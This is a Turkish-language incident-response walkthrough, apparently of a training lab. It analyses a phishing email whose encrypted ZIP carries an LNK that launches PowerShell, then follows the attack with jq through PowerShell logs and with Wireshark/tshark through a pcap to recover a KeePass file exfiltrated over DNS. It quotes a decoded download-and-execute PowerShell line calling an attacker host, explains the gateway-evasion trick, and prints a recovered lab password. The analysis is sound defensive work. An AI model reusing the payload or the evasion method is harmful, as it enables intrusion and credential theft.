## 3. Aşama Aşama Teknik Analiz, Komutlar ve Parametreler

### Aşama 1: Oltalama E-postası (`dump.eml`) ve LNK Analizi

E-posta başlıkları (`Headers`) ve içeriği incelendiğinde saldırganın üçüncü parti bir e-posta gönderim servisi kullandığı ve eki şifreleyerek antivirüs/ağ geçidi taramalarını atlattığı görülür.

  

Bash

```
# 1. E-posta içindeki gönderici, alıcı ve üçüncü parti relay (DKIM / List-Unsubscribe) başlıklarını inceleme
grep -E "From:|To:|DKIM-Signature:|List-Unsubscribe:" dump.eml

# 2. Manuel Yöntem: E-posta altındaki Base64 kodlu eki çözüp ZIP dosyası olarak kaydetme
cat payload_base64.txt | base64 -d > Invoice.zip

# 3. Şifreli ZIP arşivini e-posta gövdesinde verilen parola (Invoice2023!) ile açma
unzip -P 'Invoice2023!' Invoice.zip

# 4. Çıkan Windows kısayol (.lnk) dosyasının adli analizini yapma
lnkparse Invoice_20230103.lnk

# 5. LNK içinden çıkan Base64 kodlu PowerShell argümanını çözüp okuma (UTF-16LE formatındadır)
echo "aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==" | base64 -d
```

#### Komut ve Parametre Açıklamaları:

- `base64 -d`: Base64 ile kodlanmış metni çözer (`decode`) ve ikili/metin çıktısını üretir.
    
      
    
- `lnkparse <dosya.lnk>`: Kısayol dosyasının meta verilerini ve çalıştırdığı gizli `Command Line Arguments` (Komut Satırı Argümanları) alanını ekrana basar.
    
      
    
- **Çözülen İlk Yük (Initial Payload):**
    
      
    
    `iex (new-object net.webclient).downloadstring('[http://files.bpakcaging.xyz/update](http://files.bpakcaging.xyz/update)')`
    
      
    

> [!TIP]
> 
> **Neden Şifreli ZIP içinde `.lnk` Kullanılır?**
> 
>   
> 
> E-posta güvenlik ağ geçitleri (Secure Email Gateways) şifreli ZIP dosyalarının içini parola olmadan tarayamaz. Saldırgan parolayı (`Invoice2023!`) e-posta metnine yazar. Kurban arşivi açtığında içindeki `.lnk` dosyası PDF veya Word simgesi taşısa bile arka planda doğrudan `powershell.exe -enc ...` komutunu tetikler.

### Aşama 2: PowerShell Günlüklerinin (`powershell.json`) `jq` ile Analizi

Saldırganın uç noktada çalıştırdığı komutları kronolojik olarak görmek için `jq` aracı kullanılır.

  

#### A. Temel `jq` Sorgu Şablonları (Oda Rehberi)

Bash

```
# 1. Tüm JSON dosyasını okunabilir (girintili ve renklendirilmiş) biçimde ekrana basar
cat powershell.json | jq

# 2. Belirli bir alanın (Field1) sadece değerlerini yazdırır (Alan adını yazdırmaz)
cat powershell.json | jq '.Field1'

# 3. Belirli bir alanı JSON nesnesi biçiminde ({ "Field1": "Değer" }) yazdırır
cat powershell.json | jq '{Field1}'

# 4. Birden fazla alanı aynı anda filtreleyip yazdırır
cat powershell.json | jq '{Field1, Field2}'

# 5. Tüm kayıtları Timestamp (Zaman Damgası) alanına göre kronolojik sıralar ve satır satır basar
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'

# 6. Zaman damgasına göre sıralayıp yalnızca istenen alanı görüntüler
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}'
```

#### B. Vaka Üzerinde Uygulanan Hedefli Av (Threat Hunting) Sorguları

Bash

```
# 1. Saldırganın kullandığı C2 ve dosya barındırma domainlerini bulmak için http geçen blokları süzme
cat powershell.json | jq '{ScriptBlockText}' | grep "http"

# 2. İndirilen sq3.exe (SQLite) aracının hangi dosyaya eriştiğini ve hangi dizine gidildiğini bulma
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq | grep -e 'sq3.exe' -e 'cd'

# 3. Tüm benzersiz ScriptBlockText içeriklerini kronolojik olarak inceleme (Exfiltration tespiti)
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq
```

#### Parametrelerin Satır Satır Açıklaması:

- `jq -s` (`--slurp`): Ardışık JSON nesnelerini tek bir büyük dizi (array) içine alır; böylece `sort_by` fonksiyonu tüm loglar üzerinde sıralama yapabilir.
    
      
    
- `jq -c` (`--compact-output`): Her bir JSON nesnesini çok satırlı yapmak yerine tek bir satıra sıkıştırarak `grep`, `sort` ve `uniq` ile işlenmesini kolaylaştırır.
    
      
    
- `sort_by(.Timestamp) | .[]`: Kayıtları zaman sırasına sokar ve tekrar tekil elemanlara ayırır.

### Aşama 3: Ağ Trafiği (`capture.pcapng`) Analizi ve Veri Kurtarma

PowerShell loglarında tespit edilen C2 IP adresi **`167.71.211.113`** üzerinden Wireshark ve Tshark ile ağ trafiği incelenir.

  

#### A. Wireshark Görüntüleme Filtreleri (Display Filters)

Kod snippet'i

```
# 1. Saldırganın dosya sunucusu yazılımını (Server header) görmek için HTTP yanıtlarını filtreleme
ip.addr == 167.71.211.113 and http.response

# 2. C2 sunucusuna gönderilen komut çıktılarını (HTTP POST) inceleme
ip.addr == 167.71.211.113 and http.request.method == "POST"

# 3. Veri sızdırma (Exfiltration) protokolünü ve uzun DNS sorgularını tespit etme
ip.dst == 167.71.211.113 and (dns.qry.name.len >= 18 or http)

# 4. Sadece sızdırılan Hex parçalarını içeren DNS A kaydı sorgularını (yanıtları hariç tutarak) süzme
ip.dst == 167.71.211.113 and dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name contains ".bpakcaging.xyz"
```

#### Wireshark Bulguları:

- **Sunucu Yazılımı:** HTTP Response paketlerindeki `Server: SimpleHTTP/0.6 Python/3.x` başlığından saldırganın **`python`** kullandığı görülür.
    
      
    
- **C2 İletişim Metodu:** Çalıştırılan komutların çıktıları C2 sunucusuna **`POST`** metodu ile gönderilmektedir.
    
      
    
- **KeePass Parolasının Bulunması:** `sq3.exe` aracının `plum.sqlite` dosyasını okuduğu zaman damgası (**17:25:39**) civarındaki HTTP `POST` isteği incelendiğinde, gönderilen Base64/Hex verisi CyberChef ile çözüldüğünde Sticky Notes içindeki KeePass ana parolası ortaya çıkar:
    
      
    
    **`%p9^3!lL^Mz47E2GaT^y`**
    
      
    

#### B. Tshark ile DNS Üzerinden Sızdırılan KeePass (`.kdbx`) Dosyasını Kurtarma

Saldırgan `protected_data.kdbx` dosyasını Hex'e çevirip `nslookup` ile `<50_KARAKTER_HEX>.bpakcaging.xyz` şeklinde DNS sorguları olarak göndermiştir. Bu parçaları PCAP'ten çekip tekrar `.kdbx` dosyasına dönüştürmek için şu komut zinciri kullanılır:

  

Bash

```
# 1. Tshark ile hedef IP'ye giden DNS sorgularını filtrele, sadece sorgu adını kes, tekrarları sil ve hex'i çöz
tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 and dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name contains ".bpakcaging.xyz"' -T fields -e dns.qry.name | cut -d '.' -f 1 | uniq | tr -d '\n' | xxd -r -p > recovered.kdbx

# Alternatif (Standart Tshark Çıktısı Üzerinden Kesme):
tshark -r capture.pcapng -Y 'dns.qry.name contains ".bpakcaging.xyz" and dns.flags.response == 0' | cut -d ' ' -f 12 | cut -d '.' -f 1 | uniq | tr -d '\n' | xxd -r -p > protected_data.kdbx

# 2. Kurtarılan dosyayı KeePass ile açma (Parola: %p9^3!lL^Mz47E2GaT^y)
keepass2 recovered.kdbx
```

#### Tshark ve Boru Hattı (Pipeline) Parametrelerinin Satır Satır Açıklaması:

- `tshark -r capture.pcapng`: Belirtilen PCAP dosyasını okur (`-r`).
    
      
    
- `-Y '...'`: Wireshark görüntüleme filtresini (Display Filter) uygular. `dns.flags.response == 0` sadece istemciden çıkan sorguları alır, DNS yanıtlarını eler.
    
      
    
- `-T fields -e dns.qry.name`: Tüm paket özeti yerine yalnızca DNS sorgu adını (`<HEX>.bpakcaging.xyz`) ekrana basar.
    
      
    
- `cut -d '.' -f 1`: Nokta (`.`) karakterini ayırıcı (`delimiter`) olarak kullanır ve 1. alanı (yani `.bpakcaging.xyz` öncesindeki saf Hex dizisini) alır.
    
      
    
- `uniq`: `nslookup` her sorguyu birkaç kez tekrar ettiği için ardışık kopya satırları teke indirir.
    
      
    
- `tr -d '\n'`: Tüm satır sonu (`newline`) karakterlerini silerek Hex parçalarını tek bir kesintisiz satır haline getirir.
    
      
    
- `xxd -r -p > recovered.kdbx`: Düz (`plain`) Hex metnini tersine çevirerek (`revert`) orijinal ikili KeePass veritabanı dosyasını oluşturur.
